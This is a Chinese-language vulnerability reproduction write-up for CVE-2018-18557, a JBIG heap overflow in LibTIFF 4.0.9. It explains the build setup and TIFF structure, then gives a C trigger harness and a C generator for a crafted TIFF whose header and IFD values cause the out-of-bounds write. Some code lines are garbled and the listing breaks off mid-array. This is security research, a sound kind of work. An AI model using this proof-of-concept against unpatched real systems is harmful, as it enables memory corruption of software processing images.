# 前言
[cve描述](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18557)：
> LibTIFF 4.0.9 (with JBIG enabled) decodes arbitrarily-sized JBIG into a
> buffer, ignoring the buffer size, which leads to a tif_jbig.c JBIGDecode
> out-of-bounds write.
该cve发生在LibTIFF 4.0.9版本中，由于在解码JBIG的时候没有对size 进行验证，在JBIGDecode函数中会造成大量数据的堆溢出
# 编译安装
为了复现该漏洞，需要使得LibTIFF 支持jbig解码功能，所以需要先安装libjbig-dev
`sudo apt-get install libjbig-dev`
然后编译安装LibTIFF 4.0.9，[链接在此](https://www.exploit-db.com/apps/54bad211279cc93eb4fca31ba9bfdc79-tiff-4.0.9.tar.gz)
`./configure --prefix=/xxxx/xxx/build`
`make && make install`
# tiff文件格式
TIFF是Tagged Image File Format的缩写 ， 标签图像文件格式
TIFF与其他文件格式最大的不同在于除了图像数据，它还可以记录很多图像的其他信息。它记录图像数据的方式也比较灵活， 理论上来说，
任何其他的图像格式都能为TIFF所用， 嵌入到TIFF里面。比如JPEG， Lossless JPEG，
JPEG2000和任意数据宽度的原始无压缩数据都可以方便的嵌入到TIFF中去。由于它的可扩展性，
TIFF在数字影响、遥感、医学等领域中得到了广泛的应用。TIFF文件的后缀是.tif或者.tiff
Tiff的结构大概是这样的组成：
文件头信息区（IFH）、图像文件目录（IFD）和图像数据区
而IFD又包含了很多DE（ Directory Entry ）
简单的说，IFD用于存储描述图像的属性信息，如图像的 长、宽、分辨率等 ，DE就是一个个不同属性描述。而图像数据区则直接存储像素信息的二进制数据
这里只做简单介绍，详细可见： 
可以下载他的tiff例子，载入010editor中跟着看，对了解tiff非常有帮助
# 触发漏洞
参考了一波 
但发现这上面所谓的poc，只能说是一个用于生成触发漏洞tiff文件的代码而已，那具体怎么使用libtiff的代码才能触发漏洞，这还得俺自己动手写
通过调试+源码查看，分析函数调用，真正的poc如下
    #include 
    #include "tiffio.h"
    int main(int argc, char const *argv[])
    {
        if (argc\n",argv[0]);
            return -1;
        }
        TIFF* tif = TIFFOpen(argv[1], "r");
        if (tif) {
        tdata_t buf;
        tstrip_t strip;
        buf = _TIFFmalloc(TIFFStripSize(tif));
        for (strip = 0; strip 
    #include 
    #include 
    #include 
    #include "jbig.h"
    void output_bie(unsigned char *start, size_t len, void *file)
    {
      fwrite(start, 1, len, (FILE *) file);
      return;
    }
    int main(int argc, char**argv)
    {
      FILE* inputfile = fopen(argv[1], "rb");
      FILE* outputfile = fopen(argv[2], "wb");
      // Write the hacky TIF header.
      unsigned char buf[] = {
        0x49, 0x49, // Identifier.
        0x2A, 0x00, // Version.
        0xCA, 0x03, 0x00, 0x00, // First IFD offset.
        0x32, 0x30, 0x30, 0x31,
        0x3a, 0x31, 0x31, 0x3a,
        0x32, 0x37, 0x20, 0x32,
        0x31, 0x3a, 0x34, 0x30,
        0x3a, 0x32, 0x38, 0x00,
        0x38, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00,
        0x38, 0x00, 0x00, 0x00,
        0x00, 0x01, 0x00, 0x00
      };
      fwrite(&(buf[0]), sizeof(buf), 1, outputfile);
      // Read the inputfile.
      struct stat st;
      stat(argv[1], &st);
      size_t size = st.st_size;
      unsigned char* data = malloc(size);
      fread(data, size, 1, inputfile);
      // Calculate how many "pixels" we have in the input.
      unsigned char *bitmaps[1] = { data };
      struct jbg_enc_state se;
      jbg_enc_init(&se, size * 8, 1, 1, bitmaps, output_bie, outputfile);
      jbg_enc_out(&se);
      jbg_enc_free(&se);
      // The raw JBIG data has been written, now write the IFDs for the TIF file.
      unsigned char ifds[] = {
        0x0E, 0x00, // Number of entries.     +0
        0xFE, 0x00, // Subfile type.          +2
        0x04, 0x00, // Datatype: LONG.        +6
        0x01, 0x00, 0x00, 0x00, // 1 element. +10
        0x00, 0x00, 0x00, 0x00, // 0          +14
        0x00, 0x01, // IMAGE_WIDTH            +16
        0x03, 0x00, // Datatype: SHORT.       +18
        0x01, 0x00, 0x00, 0x00, // 1 element. +22
        0x96, 0x00, 0x00, 0x00, // 96 hex width.  +26
        0x01, 0x01, // IMAGE_LENGTH           +28
        0x03, 0x00, // SHORT                  +30
        0x01, 0x00, 0x00, 0x00, // 1 element  +34
        0x96, 0x00, 0x00, 0x00, // 96 hex length. +38
        0x02, 0x01, // BITS_PER_SAMPLE        +40
        0x03, 0x00, // SHORT                  +42
        0x01, 0x00, 0x00, 0x00, // 1 element  +46
        0x01, 0x00, 0x00, 0x00, // 1          +50
        0x03, 0x01, // COMPRESSION            +52
        0x03, 0x00, // SHORT                  +54
        0x01, 0x00, 0x00, 0x00, // 1 element  +58
        0x65, 0x87, 0x00, 0x00, // JBIG       +62
        0x06, 0x01, // PHOTOMETRIC            +64
        0x03, 0x00, // SHORT                  +66
        0x01, 0x00, 0x00, 0x00, // 1 element  +70
        0x00, 0x00, 0x00, 0x00,          // / +74
        0x11, 0x01, // STRIP_OFFSETS          +78
        0x04, 0x00, // LONG                   +80
        0x13, 0x00, 0x00, 0x00, // 0x13 elements  +82
        0x2C, 0x00, 0x00, 0x00, // Offset 2C in file  +86
        0x15, 0x01, // SAMPLES_PER_PIXEL      +90
        0x03, 0x00, // SHORT                  +92
        0x01, 0x00, 0x00, 0x00, // 1 element  +94
        0x01, 0x00, 0x00, 0x00, // 1          +98
        0x16, 0x01, // ROWS_PER_STRIP         +102
        0x04, 0x00, // LONG                   +104
        0x01, 0x00, 0x00, 0x00, // 1 element  +106
        0xFF, 0xFF, 0xFF, 0xFF, // Invalid    +110
        0x17, 0x01, // STRIP_BYTE_COUNTS      +114
        0x04, 0x00, // LONG                   +116
        0x13, 0x00, 0x00, 0x00, // 0x13 elements  +118
        0xC5, 0xC0, 0x00, 0x00, // Read 0xC0C5 bytes for the strip? +122